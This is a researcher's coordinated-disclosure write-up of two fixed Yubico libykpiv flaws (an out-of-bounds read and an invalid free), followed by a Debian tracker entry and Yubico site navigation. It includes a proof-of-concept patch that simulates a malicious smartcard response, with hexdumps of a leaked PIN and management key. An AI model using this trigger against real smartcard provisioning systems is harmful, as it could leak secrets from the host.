=== Content from blog.inhq.net_e3b5e892_20250119_121045.html ===
![](https://mato.inhq.net/m?rec=1&bots=1&idsite=1)[invd blog](/)

[Archive](/archive/)[CVEs](/cve/)[Consulting](/consulting/)[About](/about/)

# Yubico libykpiv Vulnerabilities

Jul 8, 2020
â¢
Christian Reitter
ID:
CVE-2020-13131,
CVE-2020-13132

Related articles:
[Yubico YubiHSM PKCS#11 Library Vulnerability (CVE-2023-39908)](/posts/yubico-yubihsm-pkcs-vuln/)
â¢ [Yubico libykpiv Vulnerabilities II](/posts/yubico-libykpiv-vuln2/)
â¢ [Yubico yubihsm-shell Vulnerability (CVE-2021-43399)](/posts/yubico-yubihsm-shell-vuln3/)

In April, I analyzed two Yubico C smartcard libraries using libFuzzer.

During this process, I found two vulnerabilities in [libykpiv](https://developers.yubico.com/yubico-piv-tool/) plus a few minor other security problems and a number of generic bugs.
Essentially, a malicious [PIV](https://developers.yubico.com/PIV/) (FIPS 201) smartcard can cause two sorts of issues during the host-initiated private RSA key generation, namely an **out of bounds read** on the host library stack ([CVE-2020-13131](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13131)) and a **denial of service** ([CVE-2020-13132](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13132)). Under some conditions, host process memory is copied into a corrupted RSA public key and returned by the library to the caller. The potential to obtain stack memory of the host via public keys is an unusual information leak.

The following article will describe the issues and how they were found.

## Contents

* [Fuzzing Methodology](#fuzzing-methodology)
* [The Vulnerabilities](#the-vulnerabilities)
  + [Out of Bounds Read - CVE-2020-13131](#out-of-bounds-read---cve-2020-13131)
  + [Denial of Service - CVE-2020-13132](#denial-of-service----cve-2020-13132)
  + [Attack Scenario and Security Implications](#attack-scenario-and-security-implications)
  + [Proof Of Concept](#proof-of-concept)
* [Note on Older Cryptography Standards](#note-on-older-cryptography-standards)
* [Thoughts on This Attack Class](#thoughts-on-this-attack-class)
* [Coordinated Disclosure](#coordinated-disclosure)
  + [Relevant yubico-piv-tool / libykpiv Sources](#relevant-yubico-piv-tool--libykpiv-sources)
  + [Other Relevant Software](#other-relevant-software)
  + [Detailed Timeline](#detailed-timeline)
  + [Bug Bounty](#bug-bounty)
## Consulting

*Iâm a freelance Security Consultant and currently available for new projects.
If you are looking for assistance to secure your projects or organization, [contact me](/consulting).*

## Fuzzing Methodology

First, some background information on the automated error-finding approach and related challenges.

The libykpiv library source repository also contains the yubico-piv-tool CLI, which uses the library to provide a number of management functions of PIV smartcards and is the official tool to manage some PIV aspects of YubiKey devices. I decided to fuzz the library through this tool.
Broadly speaking, I replaced parts of the yubico-piv-tool programming so that libFuzzer is in control over all relevant data inputs. To achieve this, the command line parameters (*argv*), the smartcard responses (*pcsc-lite backend*) and the `stdin`-based interactive user inputs are (mostly) fed with fuzzer-controlled data. To explain this on a higher level: libFuzzer âdecidesâ which PIV management operations are called, which data the user feeds in and how the virtual smartcard reacts to them. As a result, the fuzzer can test a broad range of states within the program for crashes and runtime errors without requiring purposefully written code for each management operation. As it is common during fuzzing, the AddressSanitizer, UndefinedBehaviorSanitizer and MemorySanitizer modules are used in varying configurations to provide enhanced error detection.

This fuzzing setup required several code iterations to work well and still progresses a lot slower when compared to targeted function-level fuzzing. However, it has the major advantage of staying close to the real-world code behavior (-> *tests everything that is reachable through `main()` of the CLI tool*) while automatically looking for problematic edge cases without extensive manual intervention. For example, the fuzzer will try to find and use undocumented command line flags and flag combinations, but will not call library functions in ways that are unreachable in the normal program. In general, this approach is complex and not suited for every target, but it can save a lot of work when compared to building and managing a dozen narrow, specialized fuzzer harnesses for individual functions. This is particularly useful during explorative work on a foreign codebase, as it was the case here. It might not be suited very well if youâre going for unit-test like coverage of each function.

To help the fuzzer exploration, I manually collected some interesting command line flag snippets in a [dictionary file](https://llvm.org/docs/LibFuzzer.html#dictionaries).

As usual, there are a number of general code changes that one has to perform on a program before it is usable with libFuzzer. In particular, the resulting binary

* should not have side effects between individual runs (*this involves resetting certain variables*)
* should not exhibit general stability issues during runtime (*file writes, resource leaks, â¦*)
* each individual program run should be fast (*no blocking input or sleep operations*)

For yubico-piv-tool, this meant finding and fixing [a number of bugs](https://github.com/Yubico/yubico-piv-tool/issues?q=is%3Aissue+is%3Aclosed+author%3Ainvd) so that stable fuzzing operations ran longer than a few minutes. There are still some remaining memory leaks in the codebase, particularly in the OpenSSL handling, but Iâm optimistic that Yubico developers will fix those in the next 1-2 releases.

## The Vulnerabilities

### Out of Bounds Read - CVE-2020-13131

The `ykpiv_util_generate_key()` function in the libykpiv host-side library is designed to trigger a private key generation within the PIV smartcard and return the corresponding public key that is parsed from the smartcard response.

Note: a number of USB hardware tokens such as the YubiKey 5 series also act as the PIV smartcard & reader, so this applies to them as well if the affected functionality is used.

Relevant code paths:

* RSA1024 / RSA2048: **affected**
* ECC P256 / ECC P384: not affected

*Interestingly, the RSA path of the key generation function has some extra handling logic due to the infamous [Return of Coppersmithâs attack](https://en.wikipedia.org/wiki/ROCA_vulnerability) on RSA keys that was present in the firmware of older YubiKey 4 devices through a flaw in an Infineon cryptography library. This is not relevant for the attack that is discussed here, though.*

After checking the validity of some function parameters, `_ykpiv_transfer_data()` is called. This prompts the smartcard to actually **generate** the requested **private key** and store it internally in a specific key slot. If the operation is successful, the smartcard will return several data fields in its response that contain the corresponding **public key** in the form of the cryptographic key components.
The smartcard response is temporarily stored in an `unsigned char data[1024]` message buffer on the host, which will become relevant later.

Consider the following code section that parses the response for the RSA case:

```
  if ((YKPIV_ALGO_RSA1024 == algorithm) || (YKPIV_ALGO_RSA2048 == algorithm)) {
    unsigned char *data_ptr = data + 5;
    size_t len = 0;

    if (*data_ptr != TAG_RSA_MODULUS) {
      if (state->verbose) { fprintf(stderr, "Failed to parse public key structure (modulus).\n"); }
      res = YKPIV_PARSE_ERROR;
      goto Cleanup;
    }

    data_ptr++;
    data_ptr += _ykpiv_get_length(data_ptr, &len);

    cb_modulus = len;
    if (NULL == (ptr_modulus = _ykpiv_alloc(state, cb_modulus))) {
      if (state->verbose) { fprintf(stderr, "Failed to allocate memory for modulus.\n"); }
      res = YKPIV_MEMORY_ERROR;
      goto Cleanup;
    }

    memcpy(ptr_modulus, data_ptr, cb_modulus);
```

[util.c](https://github.com/Yubico/yubico-piv-tool/blob/d5a78951119c94bf232472900be74fdc651eb36e/lib/util.c#L896-L916)

The modulus field in the response has a variable length, therefore the `_ykpiv_get_length(data_ptr, &len)` function is used to parse the relevant length field for a matching memory allocation. Unfortunately, the resulting length of `0 to 65535` in the variable `len` is then **used without any bounds checks** in the following memory operations, which represents the essential memory handling flaw of this vulnerability. The unchecked length field allows an attacker to significantly over-report the actual length of the provided data fields in the smartcard response and cause an **out of bounds read** on the host through the `memcpy()` operation that reads from the `data[1024]` buffer.

As a consequence, uninitialized memory in `data` and up to ~64.5k bytes of stack memory behind `data` will be copied into the freshly allocated `ptr_modulus` buffer on the heap.
This memory will only be returned to the caller if the key generation function completes **without errors**, so it is in the interest of the attacker to make that happen.

The RSA handling of `ykpiv_util_generate_key()` contains two variable length fields: first the **modulus** (code shown above) and then the **exponent**.
Due to the way that `data_ptr` is incremented, attacking the modulus field is problematic and fails with a high probability since a specific followup check against `*data_ptr` contents has to succeed despite pointing to stack memory that is not controlled by the attacker.

The better approach for an attacker is to report a small length value on the **modulus field** and then over-report the length for the **exponent field** (`cb_exp`). The code for this second read operation is shown here:

```
    data_ptr += _ykpiv_get_length(data_ptr, &len);

    cb_exp = len;
    if (NULL == (ptr_exp = _ykpiv_alloc(state, cb_exp))) {
      if (state->verbose) { fprintf(stderr, "Failed to allocate memory for public exponent.\n"); }
      res = YKPIV_MEMORY_ERROR;
      goto Cleanup;
    }

    memcpy(ptr_exp, data_ptr, cb_exp);
```

[util.c](https://github.com/Yubico/yubico-piv-tool/blob/d5a78951119c94bf232472900be74fdc651eb36e/lib/util.c#L927-L936)

This attack vector is much more reliable since there is no following check on `*data_ptr` values after this copy operation. Once the function returns with the return code `YKPIV_OK`, it depends **on the caller of the libykpiv library function** how the large information leak in `*exp` and the large `*exp_len` length is handled.

For the yubico-piv-tool CLI tool, the leaked data will be **processed via OpenSSL** bignum functions and copied as encoded ASN.1 binary data into the **public key** that is returned to the user (*via stdout or file write*).
It is plausible that this local information leak can lead to further exposure of the relevant data since public keys are designed to be copied across trust boundaries.

Other callers of libykpiv might reject the returned data due to the abnormal exponent length or unintentionally crash due to other memory issues.
Note that depending on the size specified by the attacker via the over-reported length field, it is possible that libykpiv will crash with a segfault if the read operation goes beyond the available stack space.

See the sections below for more thoughts on the practical impact.

### Denial of Service - CVE-2020-13132

The `ykpiv_util_generate_key()` function has a second problematic code path in the RSA1024 / RSA2048 key generation.

In the cleanup section, `free()` is called on the wrong pointer if `ptr_modulus` is set:

```
Cleanup:

  if (ptr_modulus) { _ykpiv_free(state, modulus); }
```

[util.c](https://github.com/Yubico/yubico-piv-tool/blob/d5a78951119c94bf232472900be74fdc651eb36e/lib/util.c#L991-L993)

The program will crash with a deadly signal if this code is reached.

Here is the verbose warning if the program is explicitly instrumented with the AddressSanitizer:

> ==20689==ERROR: AddressSanitizer: attempting free on address which was
> not malloc()-ed: 0x7ffc74123880 in thread T0

`ptr_modulus` is usually `NULL` if there are obvious problems, and it is set back to `NULL` if the data parsing for the RSA case was successful.
This explains why the problem was not detected during regular testing: the edge case is only reached if a (simulated) smartcard responds with *mostly* good data to pass some of the function checks.

A malicious smartcard could do the following to trigger the issue during a key generation request:

1. report `SW_SUCCESS` on the data transfer and provide some response bytes
2. set `TAG_RSA_MODULUS` correctly
3. set a reasonable, small `cb_modulus` length (-> for `ptr_modulus` allocation) and some dummy data for the modulus
4. set `TAG_RSA_EXP` **incorrectly** to trigger `goto Cleanup`
5. -> program crash

Although it is present in the same code section, the crash is not directly an âinsufficient length field validationâ problem and distinct enough from the first issue to be treated separately.

### Attack Scenario and Security Implications

As described in the previous sections, CVE-2020-13131 and CVE-2020-13132 are located in the `ykpiv_util_generate_key()` function of the host library.
They are exposed when libykpiv is used to request a new RSA private key generation from the smartcard.
During this particular operation, a malicious device that is recognized as the target smartcard can trigger the out of bounds read on the stack or crash the process.

Note that the vulnerabilities

* are **not reachable** during regular PIV verification usage or other daily workflows that do not include key generation
* will **not be triggered** by genuine smartcards (*unless there is some transmission error*)
* are **on the host side** and **do not affect** the YubiKey device firmware code

For the typical Linux user with a YubiKey on their keychain and the occasional use of `yubico-piv-tool` for device configuration, the practical security impact of these issues is fairly small.
The same is true for users on Windows and other operating systems, from what I can tell.

If a particular public key generated via `yubico-piv-tool` is fully functional (*for example, successful login with your smartcard*) then it is unlikely to contain any leaked stack memory.

The CVE issues are of concern to automated systems that use libykpiv to provision externally provided smartcards (*where a fake smartcard could be part of a batch of devices or physically plugged into the target machine*), particularly if those systems call the configuration tools with secret values (*management key, PIN, bash environment variables, other secret internal state*) and rely on uninterrupted operation or expose the resulting public key to some third party.
I **am not aware** of any public product that does this. However, I would not be surprised if automated systems of this sort exist somewhere, perhaps in proprietary form, in order to provision or manage a collection of physical keys at some enterprise or institution that relies on PIV authentication.

#### CVSS Score

Yubico has evaluated both the [first](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:P/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N) and [second](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:P/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N) issue with a CVSSv3.1 score of 4.3.

### Proof Of Concept

The following patch for libykpiv simulates a malicious smartcard response to trigger CVE-2020-13131. Use it together with your target program and a physical PIV token to test the practical impact.

**WARNING: use the following code at your own risk. Assume that this will PERMANENTLY overwrite data on the dummy smartcard device that you use.**

```
-  if (YKPIV_OK != (res = _ykpiv_transfer_data(state, templ, in_data, (long)(in_ptr - in_data), data, &recv_len, &sw))) {
+  // simulate malicious smartcard answer
+  // [0-4] dummy bytes
+  // [5] TAG_RSA_MODULUS
+  // [6] short length field
+  // [7] modulus data
+  // [8] TAG_RSA_EXP
+  // [9-12] length field - long form
+  // the length is given as \x20\x00 = 8192 bytes in this example
+  unsigned char response[] = "\x00\x00\x00\x00\x00\x81\x01\x00\x82\x82\x20\x00";
+  recv_len = sizeof(response);
+  memcpy(data, response, recv_len);
+  sw = SW_SUCCESS;
+
+  if (0 && YKPIV_OK != (res = _ykpiv_transfer_data(state, templ, in_data, (long)(in_ptr - in_data), data, &recv_len, &sw))) {
```

[util.c](https://github.com/Yubico/yubico-piv-tool/blob/d5a78951119c94bf232472900be74fdc651eb36e/lib/util.c#L858)

Note that all other values for `response[8]` will trigger CVE-2020-13132 instead.

#### yubico-piv-tool POC Behavior

```
./yubico-piv-tool -s9a -ARSA1024 -agenerate > public_key_output

cat public_key_output
-----BEGIN PUBLIC KEY-----
[ ... encoded memory data information leak ... ]
-----END PUBLIC KEY---

```

The OpenSSL CLI tool can be used to decode the public key data and present it in a hexdump format:

```
openssl asn1parse -in public_key_output -dump

    0:d=0  hl=4 l=14611 cons: SEQUENCE
    4:d=1  hl=2 l=  13 cons: SEQUENCE
    6:d=2  hl=2 l=   9 prim: OBJECT            :rsaEncryption
   17:d=2  hl=2 l=   0 prim: NULL
   19:d=1  hl=4 l=14592 prim: BIT STRING
      0000 - 00 30 82 38 fb 02 01 00-02 82 38 f4 00 f8 53 41   .0.8......8...SA
      [ ... binary memory data information leak ... ]

```

During testing, it was possible to leak the exact command line parameter strings that the tool is called with, including the management key (`-k` parameter) and the PIN code (`-p` parameter):

```
      2da0 - 69 63 6f 2d 70 69 76 2d-74 6f 6f 6c 2f 74 6f 6f   ico-piv-tool/too
      2db0 - 6c 2f 2e 6c 69 62 73 2f-79 75 62 69 63 6f 2d 70   l/.libs/yubico-p
      2dc0 - 69 76 2d 74 6f 6f 6c 00-2d 73 39 61 00 2d 41 52   iv-tool.-s9a.-AR
      2dd0 - 53 41 31 30 32 34 00 2d-61 67 65 6e 65 72 61 74   SA1024.-agenerat
      2de0 - 65 00 2d 6b 34 32 34 32-34 32 34 32 34 32 34 32   e.-k424242424242
      2df0 - 34 32 34 32 34 32 34 32-34 32 34 32 34 32 34 32   4242424242424242
      2e00 - 34 32 34 32 34 32 34 32-34 32 34 32 34 32 34 32   4242424242424242
      2e10 - 34 32 34 32 00 2d 70 31-32 33 34 00 53 48 45 4c   4242.-p1234.SHE

```

As you can see, the management key was chosen as a sequence of `0x42` in hexadecimal and the PIN as `1234`.

Management keys entered interactively via `stdin` are also contained in the information leak:

```
      08d0 - 00 00 00 00 00 00 00 00-00 00 00 00 00 42 42 42   .............BBB
      08e0 - 42 42 42 42 42 42 42 42-42 42 42 42 42 00 00 00   BBBBBBBBBBBBB...

```

Depending on the segmentation fault risks that an attacker is willing to take, most bash environment variables that are present during the program execution can be dumped as well, although with a considerable risk of crashing if the out of bounds read exceeds process boundaries.

Consider the following shell environment variable created with `export SECRET_ENV_VARIABLE=SECRET_VALUE` before running the vulnerable program. This is copied into the public key as well:

```
      38a0 - 48 3d 3a 00 53 45 43 52-45 54 5f 45 4e 56 5f 56   H=:.SECRET_ENV_V
      38b0 - 41 52 49 41 42 4c 45 3d-53 45 43 52 45 54 5f 56   ARIABLE=SECRET_V
      38c0 - 41 4c 55 45 00 58 44 47-5f 53 45 53 53 49 4f 4e   ALUE.XDG_SESSION

```

This sort of information disclosure is particularly concerning for automated systems, which are often configured to hold secrets in environment variables.

## Note on Older Cryptography Standards

Some readers might have noticed that RSA1024 and RSA2048 key generations are possible in the code, but RSA4096 generation is not. In fact, the stronger RSA with 4096bit length is missing simply because the PIV standard defined by NIST does not include it. Therefore it is not Yubicoâs fault that libykpiv cannot offer this variant, and it would require an update to the PIV standard to allow this.

However, it might be time to implement the recommendations by NIST (as outlined [here](https://www.yubico.com/blog/comparing-asymmetric-encryption-algorithms/) by Yubico, [current NIST document](https://csrc.nist.gov/publications/detail/sp/800-57-part-1/rev-5/final) p.59) to disallow new generation of relatively weak cryptographic keys such as RSA1024 by default to discourage their usage. For example, `yubico-piv-tool` could implement an additional flag to allow the creation of RSA1024 if explicitly requested and error out otherwise. I recommend implementing this in a future release of the code.

## Thoughts on This Attack Class

It is not the first time that memory safety issues based on unchecked length fields are found in libykpiv, as documented in Eric Sesterhennâs great talk [âIn Soviet Russia Smart Card Hacks Youâ](https://media.ccc.de/v/35c3-9346-in_soviet_russia_smart_card_hacks_you) and the related [YSA-2018-03 advisory](https://www.yubico.com/support/security-advisories/ysa-2018-03/). I discovered a conceptually similar length check issue in another Yubico library over a year ago, see the [libu2f-host vulnerabilities](/posts/yubico-libu2f-host-vuln-part1/) article and the [YSA-2019-01 advisory](https://www.yubico.com/support/security-advisories/ysa-2019-01/).

In my opinion, it is somewhat concerning that this general vulnerability pattern can still be found in cryptography-related Yubico software in 2020.

I consider it very positive that Yubicoâs host-side code is available as open-source. Among many other benefits for Yubico and the community, it allows easier code analysis by security researchers, which I consider very important for trustworthy cryptography. For example, the research presented here would not have happened without access to the source code. However, the previous history shows that code **is not** automatically audited âfor freeâ in the necessary depth just because it is available in an open-source format, permissively licensed or used in a number of Unix and Windows driver contexts.

The Yubico engineers and developers that Iâve been in contact with are competent and very dedicated. They are bringing a lot of fixes and improvements to the code as part of the constant maintenance efforts. However, I think Yubico should really consider investing more resources into this topic and systematically weed out these types of issues, particularly memory safety issues in the C code. The behavior of their drivers and libraries should be trustworthy and sane **regardless** of whether the input is coming from a malicious device or not. Cryptography-related code requires a high level of robustness.

Improving this situation will require more eyes on the problem (*= additional resources and developer time*). An open bug bounty program with reasonably competitive rewards might help with this situation in the long run and bring in some creative approaches, but it obviously requires some engineering resources on its own for triage and resolution. At times, it may require spending extra developer time on low-quality reports. But while it is not a magic fix, I would personally welcome it as a reason to do more research on their code from time to time *;)*

In parallel, it might make sense to speed up the efforts to move to memory-safe languages where the environment permits this (CLI vs. drivers), as it is already done with tools such as `YubiKey Manager` which is written in Python. However, this is a complex topic on its own and largely out of scope here.

## Coordinated Disclosure

I first contacted Yubico in April and reported a number of code issues, both via confidential disclosure emails to `security@` as well as via the public GitHub issue tracker (*after clearing them with the security contact*).

During the disclosure process, I had the opportunity to coordinate closely on the subject of security assessments, evaluate the proposed security patches and give inputs for parts of the wording. This process was very positive - I value the trust and openness shown by the vendor by including me in their issue resolution. Although it is arguably also more unpaid work on the researcher side, it can be satisfying to participate in the low-level resolution efforts if the communication is very productive, which it was.

Notably, the originally planned disclosure date was postponed on short notice. Since the disclosure was still well within the usual 90-day time frame and there were no signs that the issues are extremely dangerous or actively misused, I had no objections. From a researcher perspective, shorter disclosure time frames are obviously preferable, but I understand the necessity to balance this with other software development concerns.

Overall, I am satisfied with the disclosure process.

### Relevant yubico-piv-tool / libykpiv Sources

| variant | source | fix | references |
| --- | --- | --- | --- |
| Yubico upstream | [GitHub](https://github.com/Yubico/yubico-piv-tool) | [2.1.0](https://github.com/Yubico/yubico-piv-tool/commit/ce76c1b25482d393744e817af72c3143c346027b) | [YSA-2020-02 / YSA-2020-03](https://www.yubico.com/support/security-advisories/ysa-2020-02/), [changelog](https://developers.yubico.com/yubico-piv-tool/Release_Notes.html) |
| Debian package | [Debian](https://packages.debian.org/source/bullseye/yubico-piv-tool) | see references | [#1](https://security-tracker.debian.org/tracker/CVE-2020-13131), [#2](https://security-tracker.debian.org/tracker/CVE-2020-13132) |
| Ubuntu package | [Ubuntu](https://launchpad.net/ubuntu/%2Bsource/yubico-piv-tool) | see references | [#1](https://people.canonical.com/~ubuntu-security/cve/2020/CVE-2020-13131.html), [#2](https://people.canonical.com/~ubuntu-security/cve/2020/CVE-2020-13132.html) |
| Arch package | [Arch](https://aur.archlinux.org/packages/yubico-piv-tool/) | 2.1.0-2 | Â |
| Gentoo | [Gentoo](https://packages.gentoo.org/packages/sys-auth/yubico-piv-tool) | 2.1.1 | [#732000](https://bugs.gentoo.org/732000) |
| Fedora | [Fedora](https://src.fedoraproject.org/rpms/yubico-piv-tool) | 2.1.0-1.\* , [commit](https://src.fedoraproject.org/rpms/yubico-piv-tool/c/66f72de25aa1c316721b38ee8dcab1d93e7a987a?branch=master) | [Bug 1855024](https://bugzilla.redhat.com/show_bug.cgi?id=1855024) |
| Mac homebrew | [Homebrew](https://formulae.brew.sh/formula/yubico-piv-tool) | 2.1.0 | Â |

### Other Relevant Software

Very late in the disclosure process (early July), I noticed the experimental [yubikey-piv.rs](https://github.com/iqlusioninc/yubikey-piv.rs) project which had ported the affected Yubico C code to Rust.

As far as Iâm aware, they are not affected by the information leak aspects of CVE-2020-13131 since the out of bounds read will be mitigated in Rust by halting the program. Due to timing and other considerations, they were not included in the coordinated disclosure process.

| variant | source | fix | references |
| --- | --- | --- | --- |
| yubikey-piv.rs | [GitHub](https://github.com/iqlusioninc/yubikey-piv.rs) | [PR](https://github.com/iqlusioninc/yubikey.rs/pull/279) | [GH152](https://github.com/iqlusioninc/yubikey.rs/issues/152) |

### Detailed Timeline

| Date | info |
| --- | --- |
| 2020-04-29 | Disclosure of the out of bounds read issue to Yubico |
| 2020-04-30 | Disclosure of the crash issue to Yubico |
| 2020-04-30 | Yubico confirms the issues |
| 2020-05-07 | Yubico communicates planned public disclosure date: 2020-06-08 |
| 2020-05-18 | Yubico requests CVEs from MITRE |
| 2020-06-08 | Yubico postpones the public disclosure date |
| 2020-06-18 | Yubico communicates planned public disclosure date: 2020-07-01 |
| 2020-06-24 | Yubico communicates planned public disclosure date: 2020-07-08 |
| 2020-07-08 | Private heads-up to yubikey-piv.rs maintainer (*only high-level information*) |
| 2020-07-08 | Public disclosure of YSA-2020-02 |
| 2020-07-08 | Publication of this blog post |
| 2020-09-17 | Updated blog post, including issue references and bugfix status |

### Bug Bounty

Yubico provided a number of their hardware products as a bug bounty for this issue.

* **Christian Reitter**

Information security and other interests.



=== Content from security-tracker.debian.org_dd3bda66_20250119_135230.html ===

# CVE-2020-13132

| **Name** | CVE-2020-13132 |
| --- | --- |
| **Description** | An issue was discovered in Yubico libykpiv before 2.1.0. An attacker can trigger an incorrect free() in the ykpiv\_util\_generate\_key() function in lib/util.c through incorrect error handling code. This could be used to cause a denial of service attack. |
| **Source** | [CVE](https://www.cve.org/CVERecord?id=CVE-2020-13132) (at [NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-13132); [CERT](https://www.kb.cert.org/vuls/byid?searchview=&query=CVE-2020-13132), [LWN](https://lwn.net/Search/DoSearch?words=CVE-2020-13132), [oss-sec](https://marc.info/?l=oss-security&s=CVE-2020-13132), [fulldisc](https://marc.info/?l=full-disclosure&s=CVE-2020-13132), [Red Hat](https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2020-13132), [Ubuntu](https://people.canonical.com/~ubuntu-security/cve/CVE-2020-13132), [Gentoo](https://bugs.gentoo.org/show_bug.cgi?id=CVE-2020-13132), SUSE [bugzilla](https://bugzilla.suse.com/show_bug.cgi?id=CVE-2020-13132)/[CVE](https://www.suse.com/security/cve/CVE-2020-13132/), GitHub [advisories](https://github.com/advisories?query=CVE-2020-13132)/[code](https://github.com/search?type=Code&q=%22CVE-2020-13132%22)/[issues](https://github.com/search?type=Issues&q=%22CVE-2020-13132%22), [web search](https://duckduckgo.com/html?q=%22CVE-2020-13132%22), [more](https://oss-security.openwall.org/wiki/vendors)) |
| **Debian Bugs** | [972644](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=972644) |

## Vulnerable and fixed packages

The table below lists information on source packages.

| Source Package | Release | Version | Status |
| --- | --- | --- | --- |
| [yubico-piv-tool](/tracker/source-package/yubico-piv-tool) ([PTS](https://tracker.debian.org/pkg/yubico-piv-tool)) | bullseye | 2.2.0-1 | fixed |
|  | bookworm | 2.2.0-1.1 | fixed |
|  | sid, trixie | 2.5.2-1 | fixed |

The information below is based on the following data on fixed versions.

| Package | Type | Release | Fixed Version | Urgency | Origin | Debian Bugs |
| --- | --- | --- | --- | --- | --- | --- |
| [yubico-piv-tool](/tracker/source-package/yubico-piv-tool) | source | stretch | (not affected) |  |  |  |
| [yubico-piv-tool](/tracker/source-package/yubico-piv-tool) | source | (unstable) | 2.1.1-1 |  |  | [972644](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=972644) |

## Notes

```
[stretch] - yubico-piv-tool <not-affected> (Vulnerable code not present)
<https://www.yubico.com/support/security-advisories/ysa-2020-02/>
<https://blog.inhq.net/posts/yubico-libykpiv-vuln/>

```

---

Search for package or bug name:  [Reporting problems](/tracker/data/report)

[Home](/tracker/) - [Debian Security](https://www.debian.org/security/) - [Source](https://salsa.debian.org/security-tracker-team/security-tracker/blob/master/bin/tracker_service.py) [(Git)](https://salsa.debian.org/security-tracker-team/security-tracker)



=== Content from www.yubico.com_db4da925_20250119_121046.html ===


[Skip to content](#wp--skip-link--target)
EnglishFrançaisDeutsch日本語EspañolSvenska

* [Contact Sales](/contact-us/)
* [Resellers](/support/resellers/)
* [Support](https://support.yubico.com/hc/en-us/)

menu![X icon](https://www.yubico.com/wp-content/themes/yubicool/img/icons/close.svg)[![Yubico Header Text Logo](https://www.yubico.com/wp-content/themes/yubicool/img/logos/logo.svg)](https://www.yubico.com)
Why Yubicoexpand\_more
[Why Yubico](https://www.yubico.com/why-yubico/)
How we help

* [Enterprises](https://www.yubico.com/why-yubico/for-business/)
* [SMBs](https://www.yubico.com/why-yubico/yubico-and-smbs/)
* [Individuals](https://www.yubico.com/why-yubico/for-individuals/)
* [Developers](https://www.yubico.com/why-yubico/for-developers/)

Work with us

* [Careers](https://www.yubico.com/careers/)
* [Partner programs](https://www.yubico.com/why-yubico/partners/)

Connect & learn

* [Contact Sales](https://www.yubico.com/contact-us/)
* [Events](https://www.yubico.com/events/)
* [Press room](https://www.yubico.com/press/)
* [About us](/why-yubico/about-us/)
* [The team](/why-yubico/team/)
* [Investors](https://investors.yubico.com/)
* [Innovation history](https://www.yubico.com/why-yubico/yubico-innovation-history/)
* [Secure it Forward](https://www.yubico.com/why-yubico/secure-it-forward/)

![](https://www.yubico.com/wp-content/uploads/2023/03/WhyY-nav-easy-to-use-1.jpg)Easy-to-use, secure authenticationWith YubiKey there’s no tradeoff between great security and usabilityWhy YubiKeysecurity-advisory
![](https://www.yubico.com/wp-content/uploads/2023/03/WhyY-nav-google-1.jpg)Proven at scale at GoogleGoogle defends against account takeovers and reduces IT costsGoogle Case Studysecurity-advisory
![](https://www.yubico.com/wp-content/uploads/2023/03/img-passwordless-nav-5-1.jpg)Protecting vulnerable organizationsSecure it Forward: Yubico matches up to 5% of the number of YubiKeys purchased on Yubico.comSecure it Forwardsecurity-advisory
Productsexpand\_more
[All products](/products/)
Hardware

* [YubiKey 5 Series](https://www.yubico.com/products/yubikey-5-overview/)
* [YubiKey 5 FIPS Series](https://www.yubico.com/products/yubikey-fips/)
* [YubiKey Bio Series](https://www.yubico.com/products/yubikey-bio-series/)
* [Security Key Series](/products/security-key/)
* [YubiHSM 2 & YubiHSM 2 FIPS](https://www.yubico.com/products/hardware-security-module/)

Services

* [YubiKey as a Service](https://www.yubico.com/products/yubikey-as-a-service/)
* [YubiEnterprise Delivery](https://www.yubico.com/products/yubienterprise-delivery/)
* [Yubico Enrollment Suite](https://www.yubico.com/products/yubicoenrollmentsuite/)
* [YubiCloud](https://www.yubico.com/products/yubicloud/)

Software and tools

* [Yubico Authenticator](https://www.yubico.com/products/yubico-authenticator/)
* [Computer login tools](https://www.yubico.com/products/computer-login-tools/)
* [Software Development Toolkits](https://www.yubico.com/products/software-development-toolkits-sdks/)

Discover the YubiKey

* [Using YubiKey is easy](https://www.yubico.com/products/ease-of-use/)
* [Find the right YubiKey](/quiz/)
* [Works with YubiKey](/works-with-yubikey/catalog/)
* [Compare YubiKeys](https://www.yubico.com/store/compare/)

![](https://www.yubico.com/wp-content/uploads/2023/03/img-hundreds-services-nav-3-1.jpg)One key for hundreds of apps and servicesYubiKey works out-of-the-box and has no client software or batteryYubico protects yousecurity-advisory
![See YubiKeys as a Service](https://www.yubico.com/wp-content/uploads/2023/03/img-YubiEnterprise-nav-3-1.jpg)YubiKey as a Service delivers scale and savingsGain a future-proofed solution and faster MFA rolloutsYubiKey as a Servicesecurity-advisory
Solutionsexpand\_more
[Solutions overview](/solutions/)
Initiatives

* [Zero Trust](https://www.yubico.com/solutions/zero-trust/)
* [Executive Order OMB M-22-09](https://www.yubico.com/solutions/executive-order-hub/)
* [Phishing-resistant MFA](https://www.yubico.com/solutions/multi-factor-authentication/)
* [Passwordless](https://www.yubico.com/solutions/passwordless/)
* [Compliance](https://www.yubico.com/solutions/cybersecurity-compliance/)
* [Cyber Insurance](https://www.yubico.com/solutions/cyber-insurance/)
* [Critical infrastructure](https://www.yubico.com/solutions/critical-infrastructure-security/)
* [Secure supply chain](/solutions/supply-chain-security/)
* [Protect call centers](https://www.yubico.com/solutions/call-centers/)

Use cases

* [Hybrid & remote workers](/solutions/secure-hybrid-and-remote-workers/)
* [Secure privileged users](https://www.yubico.com/solutions/privileged-users/)
* [Mobile restricted environments](https://www.yubico.com/solutions/mobile-restricted-environment/)
* [Shared workstations](https://www.yubico.com/solutions/shared-workstations/)

Technologies

* [Microsoft ecosystem](https://www.yubico.com/solutions/microsoft-365-mfa/)
* [Salesforce workspace](https://www.yubico.com/solutions/yubico-and-salesforce/)
* [IAM solutions](https://www.yubico.com/solutions/identity-access-management/)
* [AWS environment](https://www.yubico.com/solutions/yubico-and-amazon-web-services/)
* [HYPR experience](https://www.yubico.com/solutions/hypr-and-yubico/)
* [Okta identity solutions](https://www.yubico.com/solutions/okta-and-yubico/)

![](https://www.yubico.com/wp-content/uploads/2023/03/img-passwordless-nav-5-1.jpg)The Bridge to PasswordlessBegin the journey to make your organization passwordless Get the white papersecurity-advisory
